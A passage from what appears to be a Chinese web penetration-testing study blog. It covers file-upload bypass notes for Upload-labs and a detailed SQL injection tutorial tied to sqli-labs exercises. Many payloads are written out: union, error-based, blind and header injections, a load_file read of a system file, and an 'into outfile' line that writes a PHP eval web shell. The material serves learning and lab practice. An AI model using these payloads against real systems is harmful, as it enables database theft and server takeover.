id="①ewebeditor"><a href="#①ewebeditor" class="headerlink" title="①ewebeditor"></a>①ewebeditor</h5><h5 id="②fckeditor"><a href="#②fckeditor" class="headerlink" title="②fckeditor"></a>②fckeditor</h5><h4 id="9、一些常见CMS的文件上传漏洞"><a href="#9、一些常见CMS的文件上传漏洞" class="headerlink" title="9、一些常见CMS的文件上传漏洞"></a>9、一些常见CMS的文件上传漏洞</h4><p>CMS：快速建站的框架，一些常见的CMS就有文件上传漏洞。</p><h3 id="五、文件上传靶场——Upload-lab"><a href="#五、文件上传靶场——Upload-lab" class="headerlink" title="五、文件上传靶场——Upload-lab"></a>五、文件上传靶场——Upload-lab</h3><h4 id="PASS-01：文件检测依赖前端JS代码"><a href="#PASS-01：文件检测依赖前端JS代码" class="headerlink" title="PASS-01：文件检测依赖前端JS代码"></a>PASS-01：文件检测依赖前端JS代码</h4><p>方法1、前端上传图片时，触发了表单的检查输入文件名的事件，将JS删除即可上传文件，最后通过返回的图片，右键查看图片地址，即可了解上传的文件在服务器的位置。触发xm即可。</p><p>方法2、构造xm使其符合js的要求，过掉js后，通过BP代理改掉文件后缀filename。</p><h4 id="PASS-02：文件检测依赖于MIME类型"><a href="#PASS-02：文件检测依赖于MIME类型" class="headerlink" title="PASS-02：文件检测依赖于MIME类型"></a>PASS-02：文件检测依赖于MIME类型</h4><p>可通过BP抓包，修改Content-Type类型，使其合法。</p><h4 id="PASS-04：配置文件上传漏洞——-htaccess"><a href="#PASS-04：配置文件上传漏洞——-htaccess" class="headerlink" title="PASS-04：配置文件上传漏洞——.htaccess"></a>PASS-04：配置文件上传漏洞——.htaccess</h4><h4 id="PASS-11：00截断"><a href="#PASS-11：00截断" class="headerlink" title="PASS-11：00截断"></a>PASS-11：00截断</h4><h4 id="PASS-14：文件检测依赖于getimagesize-函数"><a href="#PASS-14：文件检测依赖于getimagesize-函数" class="headerlink" title="PASS-14：文件检测依赖于getimagesize()函数"></a>PASS-14：文件检测依赖于getimagesize()函数</h4><p>多种图片马方法绕过，</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞</title>
      <link href="/2020/08/05/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7%E3%80%81SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/08/05/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7%E3%80%81SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><ul><li>SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。</li><li>攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。</li><li>如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。</li></ul><h3 id="二、SQL注入的注入点"><a href="#二、SQL注入的注入点" class="headerlink" title="二、SQL注入的注入点"></a>二、SQL注入的注入点</h3><p>1、GET</p><p>2、POST</p><p>3、COOKIE</p><p>4、HTTP头</p><p>……</p><h3 id="三、注入点的判断"><a href="#三、注入点的判断" class="headerlink" title="三、注入点的判断"></a>三、注入点的判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;35    +1&#x2F;-1    #如果有效果考虑联合查询</span><br><span class="line">?id&#x3D;35&#39;        #判断字符型还是数字型，是否有报错，有报错就报错注入</span><br><span class="line">?id&#x3D;35 and 1&#x3D;1 &#x2F; 1&#x3D;2    #判断是否可以布尔盲注</span><br><span class="line">?id&#x3D;35 and sleep(5)        #判断是否可以延时注入</span><br><span class="line">---------------------------------------------------</span><br><span class="line">order by N        #猜测数据表字段&#x2F;列的数量</span><br><span class="line">union select 1,2,3...&#x2F;null...    #猜测数据表字段&#x2F;列的数量</span><br></pre></td></tr></table></figure><h3 id="四、SQL注入的分类"><a href="#四、SQL注入的分类" class="headerlink" title="四、SQL注入的分类"></a>四、SQL注入的分类</h3><h4 id="1、按照注入点类型分类："><a href="#1、按照注入点类型分类：" class="headerlink" title="1、按照注入点类型分类："></a>1、按照注入点类型分类：</h4><h5 id="1）数字型注入："><a href="#1）数字型注入：" class="headerlink" title="1）数字型注入："></a>1）数字型注入：</h5><p>​    许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p><h5 id="2）字符型注入："><a href="#2）字符型注入：" class="headerlink" title="2）字符型注入："></a>2）字符型注入：</h5><p>​    网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name=&#39;admin&#39; and 1=1 &#39;</code> 我们需要将这些烦人的引号给处理掉。</p><h5 id="3）搜索型注入"><a href="#3）搜索型注入" class="headerlink" title="3）搜索型注入:"></a>3）搜索型注入:</h5><p>​    这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>&quot;keyword=关键字&quot;</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like &#39;%测试%&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p><h4 id="2、按照数据提交的方式来分类"><a href="#2、按照数据提交的方式来分类" class="headerlink" title="2、按照数据提交的方式来分类"></a>2、按照数据提交的方式来分类</h4><h5 id="1）GET-注入"><a href="#1）GET-注入" class="headerlink" title="1）GET 注入"></a>1）GET 注入</h5><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</p><h5 id="2）POST-注入"><a href="#2）POST-注入" class="headerlink" title="2）POST 注入"></a>2）POST 注入</h5><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p><h5 id="3）Cookie-注入"><a href="#3）Cookie-注入" class="headerlink" title="3）Cookie 注入"></a>3）Cookie 注入</h5><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p><h5 id="4）HTTP-头部注入"><a href="#4）HTTP-头部注入" class="headerlink" title="4）HTTP 头部注入"></a>4）HTTP 头部注入</h5><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p><h4 id="3、根据注入方法分类："><a href="#3、根据注入方法分类：" class="headerlink" title="3、根据注入方法分类："></a>3、根据注入方法分类：</h4><h5 id="1）联合查询："><a href="#1）联合查询：" class="headerlink" title="1）联合查询："></a>1）联合查询：</h5><blockquote><p>联合查询union是纵向拼接两个查询的虚拟表结果；union默认选取不重复的值，如允许重复使用union all</p><p>联合查询可爆破字段数，可得到回显输出，可爆破表名，可查询元数据库</p></blockquote><p><strong>联合查询的必要条件</strong>：1、两张虚拟的表具有相同的列数；2、虚拟表对应的列的数据类型要相同（数字/null可认为是任何类型）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、爆破字段数：先利用order by 爆出字段数</span><br><span class="line">2、爆破字段数：也可使用select ... union select 1,2,3....,字段数 爆出字段数</span><br><span class="line">3、回显输出：为了让我们可以真正的与目标数据库交互，也就是可以控制输入得到输出（目前我们得不到输出），因此可以这样：select ... id&#x3D;-999 (and 1&#x3D;2) union select 1,2,3....,字段数    #利用union表1为假，导致只能输出第2个表的内容</span><br><span class="line">#回显输出时如果输出类型与表1对应字段类型不同，可以使用hex()转16进制显示，得到16进制使用bp还原即可</span><br><span class="line">4、爆破表名(成功率不行)：select ... id&#x3D;-999 (and 1&#x3D;2) union select 1,2,3....,字段数 from 表名</span><br><span class="line">5、查询元数据库得到当前数据库所有表的表名：select ... id&#x3D;-999 (and 1&#x3D;2) union select 1,2,hex(group_concat(table_name))....,字段数 from information_schema.tables where table_schema&#x3D;database()    #得到当前数据库所有表的表名</span><br><span class="line">6、查询元数据库得到当前数据库某个表的所有字段：select ... id&#x3D;-999 (and 1&#x3D;2) union select 1,2,hex(group_concat(column_name))....,字段数 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0xXXXX</span><br><span class="line">#对于表名是字符串需要单引号的情况，如果不想使用单引号则可以将其转换为16进制形式，无需引号。</span><br><span class="line">7、得到查询目标表和字段直接查询：select ... id&#x3D;-999 (and 1&#x3D;2) union select 1,2,concat(字段1,0x3a(冒号),字段2)....,字段数 from 表名</span><br></pre></td></tr></table></figure><h5 id="2）布尔盲注："><a href="#2）布尔盲注：" class="headerlink" title="2）布尔盲注："></a>2）布尔盲注：</h5><p>即可以根据返回页面判断条件真假的注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;33 and length(database()) &lt; N #使用二分法猜长度</span><br><span class="line">?id&#x3D;33 and ascii(substr(database(),1,1)) &gt;&lt;?    #猜ascii，逐位爆破</span><br><span class="line">----------常用函数--------------</span><br><span class="line">MID(column_name,start[,length]);</span><br><span class="line">LEFT(str, n);</span><br><span class="line">RIGHT(str, n);</span><br><span class="line">ord(string)&#x2F;ascii()    #获得ASCII值</span><br></pre></td></tr></table></figure><h5 id="3）报错注入"><a href="#3）报错注入" class="headerlink" title="3）报错注入:"></a>3）报错注入:</h5><h6 id="1、Group-By"><a href="#1、Group-By" class="headerlink" title="1、Group By"></a>1、Group By</h6><blockquote><p>该注入方法是利用mysql5.X版本中的一个漏洞，Bug8652</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">select left(rand(),3),a,count(*) from r1 group by 1;</span><br><span class="line">select round(rand(),1),a,count(*) from r1 group by 1;</span><br><span class="line">select floor(rand()*2),a,count(*) from r1 group by 1;</span><br><span class="line">select a,count(*) from r1 group by round(rand(),1);</span><br><span class="line">#此时语句会报错，Duplicate entry &#39;泄露点&#39; for key &#39;group_key&#39;，发生了重复键错误，这个SQL解析语句的过程有关，详情见下</span><br><span class="line">#r1是一个测试用的数据表，里面只有一个字段a，表里面有数条记录，都是1或者2。</span><br><span class="line">+------+</span><br><span class="line">| a    |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">|    0 |</span><br><span class="line">|    1 |</span><br><span class="line">|    0 |</span><br><span class="line">|    1 |</span><br><span class="line">|    0 |</span><br><span class="line">|    1 |</span><br><span class="line">|    0 |</span><br><span class="line">|    0 |</span><br><span class="line">+------+</span><br><span class="line">9 rows in set (0.02 sec)</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">select concat(left(rand(),3), &#39;^&#39;, (select version()), &#39;^&#39;) as x,count(*) from  group by x;</span><br><span class="line">#当元数据库表被禁用时，注意临时表要有别名</span><br><span class="line">select concat(left(rand(),3), &#39;^&#39;, (select version()), &#39;^&#39;) as x,count(*) from (select 1 union select null union select !1)alias group by x;    </span><br><span class="line">#当rand() | count()被禁用</span><br><span class="line">select min(@a:&#x3D;1) from information_schema.tables group by concat(&#39;^&#39;,@@version,&#39;^&#39;,@a:&#x3D;(@a+1)%2);</span><br><span class="line">#不依赖额外的函数和表</span><br><span class="line">select min(@a:&#x3D;1) from (select 1 union select null union select !1)alias group by concat(&#39;^&#39;,@@version,&#39;^&#39;,@a:&#x3D;(@a+1)%2);</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">[?id&#x3D;33 and (select 1 from (select count(*), concat((select version() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+]</span><br><span class="line">[?id&#x3D;33 and (select 1 from (select count(*), concat((select version() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+]</span><br></pre></td></tr></table></figure><blockquote><p>SQL解析过程：</p><p>1、FROM：form后面的表标识了这条语句要查询的数据源，from过程之后会形成一个虚拟的表VT1。</p><p>2、WHERE：WHERE对VT1过程中生成的临时表进行过滤，满足where子句的列被插入到VT2。</p><p>3、GROUP BY：GROUP BY会把VT2生成的表按照GROUP BY中的列进行分组，生成VT3。</p><p>4、HAVING：HAVING这个子句对VT3表中的不同分组进行过滤，满足HAVING条件的子句被加入到VT4表中。</p><p>5、SELECT：SELECT这个子句对SELECT子句中的元素进行处理，生成VT5表。</p><ul><li>计算表达式，计算SELECT子句中的表达式，生成VT5-1</li><li>DISTINCT 寻找VT5-1 表中重复的列，并删掉，生成VT5-2</li><li>TOP从ORDER BY子句定义的结果中，筛选出符合条件的列，生成VT5-3。</li></ul><p>6、ORDER BY 从VT5-3中的表，根据ORDER BY子句的结果进行排序，生成VT6</p></blockquote><h6 id="2、XPATH报错"><a href="#2、XPATH报错" class="headerlink" title="2、XPATH报错"></a>2、XPATH报错</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">函数的形式为：EXTRATVALUE (XML_document, XPath_string);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">作用：从目标XML中返回包含所查询值的字符串</span><br><span class="line">注入语句为：extractvalue(1, concat(0x7e, (select 查询语句),0x7e))</span><br><span class="line">?id&#x3D;33 and extractvalue(1,concat(&#39;^&#39;,(select version()),&#39;^&#39;)) --+</span><br><span class="line">?id&#x3D;33 and extractvalue(1,concat(0x7e,(select version()),0x7e)) --+</span><br><span class="line">?id&#x3D;33 and extractvalue(1,concat(0x5e,(select version()),0x5e)) --+</span><br><span class="line"></span><br><span class="line">函数的形式为：UPDATEXML (XML_document, XPath_string, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br><span class="line">注入语句为：updatexml(1,concat(0x7e,(SELECT 查询语句),0x7e),1)</span><br><span class="line">?id&#x3D;33 and updatexml(1,concat(&#39;^&#39;,(select version()),&#39;^&#39;),1) --+</span><br><span class="line">?id&#x3D;33 and updatexml(1,concat(0x7e,(select version()),0x7e),1) --+</span><br><span class="line">?id&#x3D;33 and updatexml(1,concat(0x5e,(select version()),0x5e),1) --+</span><br></pre></td></tr></table></figure><h5 id="4）延时注入："><a href="#4）延时注入：" class="headerlink" title="4）延时注入："></a>4）延时注入：</h5><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;33 and if(length(database()) &lt;&gt; ?,sleep(n),1)</span><br></pre></td></tr></table></figure><h5 id="5）堆叠查询："><a href="#5）堆叠查询：" class="headerlink" title="5）堆叠查询："></a>5）堆叠查询：</h5><p>可以同时执行多条语句的执行时的注入。</p><h3 id="五、其它注入方式"><a href="#五、其它注入方式" class="headerlink" title="五、其它注入方式"></a>五、其它注入方式</h3><h4 id="1、SQL文件注入"><a href="#1、SQL文件注入" class="headerlink" title="1、SQL文件注入"></a>1、SQL文件注入</h4><p>前提条件：</p><p>1）secure-file-priv变量的设置，修改该参数在my.ini -&gt; [mysqld]下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv&#x3D;    #允许mysqld的导入导出操作</span><br><span class="line">secure-file-priv&#x3D;&#39;c:&#x2F;a&#x2F;&#39;    #限制mysqld的导入导出操作发生在c:&#x2F;a&#x2F;目录下</span><br><span class="line">secure-file-priv&#x3D;null    #限制mysqld不允许导入导出操作(默认)</span><br></pre></td></tr></table></figure><p>2）当前用户具有文件操作权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select File_priv from mysql.user where user&#x3D;&#39;root&#39; and host&#x3D;&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p>3）明确读取文件或写入文件的绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,load_file(&#39;C:\\Windows\\System32\\drivers\\etc\\hosts&#39;), 3 --+</span><br><span class="line">#load_file(&#39;&#39;)    读取文件</span><br><span class="line">?id&#x3D;-1 union select 1,&quot;&lt;?php @eval($_REQUEST[&#39;777&#39;]);?&gt;&quot;, 3 into outfile &#39;e:\\phpstudy\\www\\1.php&#39;--+</span><br><span class="line">#select into outfile &#39;&#39;    写入文件</span><br></pre></td></tr></table></figure><h4 id="2、宽字节注入"><a href="#2、宽字节注入" class="headerlink" title="2、宽字节注入"></a>2、宽字节注入</h4><p>当目标网页的数据库编码是多字节编码时，比如GBK，那么在某些情况下就可以通过编码的构造来使得一些特殊符号失去意义。例如在GBK编码环境下，转义字符\的编码的5c，我们可以在转义字符前加上一个字节%df，就可以使得df5c重新组成一个汉字编码，来失去转义字符\的实际意义。(GBK编码范围：8140-FEFE，剔除xx7F码位)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#数据库中 SET NAMES GBK</span><br><span class="line">?id&#x3D;1000%df&#39; union select 123 --+    #sql-lab32关</span><br></pre></td></tr></table></figure><h4 id="3、Cookie注入"><a href="#3、Cookie注入" class="headerlink" title="3、Cookie注入"></a>3、Cookie注入</h4><blockquote><p>Sqli-lab    20关</p></blockquote><p>输入用户名密码Dumb、Dumb登录，登录后，刷新一下页面抓包放入repeater模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在bp环境下，抓到带有cookie的GET报文，通过repeater模块实现攻击注入</span><br><span class="line">因无数据库回显，采用报错注入：Angelina&#39; and updatexml(1,concat(0x5e,version(),0x5e),1) #&#x2F;--空格 </span><br></pre></td></tr></table></figure><h4 id="4、base64注入"><a href="#4、base64注入" class="headerlink" title="4、base64注入"></a>4、base64注入</h4><blockquote><p>Sqli-labs 22关，此关遇到了php时区配置的警告，在php.ini中的[Date]中配置date.timezone = Asia/Shanghai</p></blockquote><p>22关也是cookie注入，只不过cookie经过了base64编码，因此我们将自己的payload进行base64编码即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#单引号、双引号测试，发现是字符型的注入，同时有报错信息，可以报错注入。</span><br><span class="line">&quot; and updatexml(1,concat(0x5e,version(),0x5e),1) # -&gt;进行base64转码</span><br></pre></td></tr></table></figure><h4 id="5、HTTP头部注入"><a href="#5、HTTP头部注入" class="headerlink" title="5、HTTP头部注入"></a>5、HTTP头部注入</h4><blockquote><p>HTTP头部注入就是指注入字段在HTTP头部的字段中，这些字段通常由User-Agent、Referer等。sqli-labs 18、19关</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#User-Agent注入</span><br><span class="line">hacker&#39; and updatexml(1,concat(0x5e,version(),0x5e),1) and 1&#x3D;&#39;1    #后续语句不能注释，故使用&#39;1闭合后面的单引号</span><br><span class="line">#Referer注入</span><br><span class="line">hacker&#39; and updatexml(1,concat(0x5e,version(),0x5e),1) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h4 id="6、二次注入-二阶注入"><a href="#6、二次注入-二阶注入" class="headerlink" title="6、二次注入/二阶注入"></a>6、二次注入/二阶注入</h4><p><a href="https://blog.csdn.net/SPS98/article/details/89930351">https://blog.csdn.net/SPS98/article/details/89930351</a></p><blockquote><p>案例Sqli-Lab /Less24</p></blockquote><p>二次注入的原理是，服务器针对数据库查询的参数值进行了转义操作。例如使用PHP的<code>mysql_escape_string</code>/<code>mysql_escape_string</code>/<code>addslashes</code>做了转义处理，比如你注入的内容是<code>1&#39;</code> ，但参数值经过转义成了<code>1\&#39;</code>，此时再插入到数据库查询语句中就是<code>select XXX from table where id = &#39;1\&#39;&#39;</code>，可以看到我们恶意构造的单引号已经被转义为了参数的一个值，不会对引号的闭合产生影响。这种服务器端的防守策略固然好，但是也是会有漏洞的。比如，数据库尽管针对用户的输入内容进行了转义，但是如果是数据插入操作，MYSQL默认会移除值中的反斜杠。一般来说，开发人员会完全信任内部的数据，不会对数据库内部取出的数据再进行转义，因此当查询出这条数据再进行数据库语句拼接操作时，这就可能引起SQL注入。</p><p>例如：某web网站对输入进行了转义处理，此时我注册一个用户名为<code>admin&#39; #</code>的账号，并且假设该网站有用户是admin、并且注册账号是单引号闭合的SQL语句。那么此时经过转义处理后成功存入到数据库，并且存入数据库Mysql默认把反斜杠去除。此时，我们登录<code>admin&#39;#</code>账号修改密码，此时就会触发SQL注入攻击。后台服务器在验证时，会从Session中取出<code>admin&#39;#</code>的用户名和密码拼接SQL语句进行操作，这个session中的用户名很可能就是登陆时数据库查询验证后从数据库中取出的值，因为完全信任内部数据而没有转义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   $sql = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$login = sqllogin();</span><br><span class="line">$_SESSION[<span class="string">&quot;username&quot;</span>] = $login;</span><br></pre></td></tr></table></figure><p>例如:<code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; </code>，此时我们构造的语句为：<code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39;</code>，可以看到admin处的内容没有经过转义直接截断了后面的判断，绕过了验证，修改了admin的密码。</p><h4 id="7、HTTP参数污染"><a href="#7、HTTP参数污染" class="headerlink" title="7、HTTP参数污染"></a>7、HTTP参数污染</h4><p>多相同名字的参数传到服务器时，不同的服务器会有不同的处理。Sqli-lab Less29，服务器是TOMCAT/JSP+APACHE/PHP，前一个过滤第一个参数是WAF功能，后一个在乎第二个参数可注入。</p><p><strong>payload</strong>：<a href="http://xxxx/?id=1&amp;id=2&#39;">http://XXXX?id=1&amp;id=2&#39;</a> union select ….</p><p><a href="https://imgchr.com/i/dDIXe1"><img src="https://s1.ax1x.com/2020/08/24/dDIXe1.png" alt="dDIXe1.png"></a></p><h4 id="8、基于约束的SQL注入"><a href="#8、基于约束的SQL注入" class="headerlink" title="8、基于约束的SQL注入"></a>8、基于约束的SQL注入</h4><p><a href="https://evi1s.com/archives/103/">https://evi1s.com/archives/103/</a></p><p>数据库字段属性设置的长度是20，比如这个字段是usename，当我们进行一个注册的业务时，我们可以构造<code>admin 若干空格 1</code>，超出20的长度范围，Mysql不会拒绝过长的数据插入记录，而会将多余的部分截断，再插入。此时数据库就出现了两个admin用户，我们可以通过自己注册的admin用户登录到网站中。具体危害不好说，主要出现在CTF题中。</p><h3 id="六、Mysql数据库的基础相关"><a href="#六、Mysql数据库的基础相关" class="headerlink" title="六、Mysql数据库的基础相关"></a>六、Mysql数据库的基础相关</h3><p>1、注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- #（杠杠空格）</span><br><span class="line">--+</span><br><span class="line">&#x2F;* .... *&#x2F;</span><br><span class="line">&#x2F;*! .... *&#x2F;    #内联查询</span><br></pre></td></tr></table></figure><p>2、Mysql元数据数据库</p><blockquote><p>元数据就是Mysql系统中的库名、表明、字段名等主要信息，他们被统一组织在<strong>information_schema</strong>数据库中（5.0前没有）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TABLES表</span><br><span class="line">    table_name字段 #存储了数据库系统中的所有表名</span><br><span class="line">    table_schema字段    #对应表所属的数据库名</span><br><span class="line">COLUMNS表</span><br><span class="line">    column_name字段 #存储系统中所有字段名</span><br><span class="line">    table_name字段 #字段所属表名</span><br><span class="line">    table_schema字段 #字段所属数据库名</span><br></pre></td></tr></table></figure><p>3、Mysql常用函数与参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span 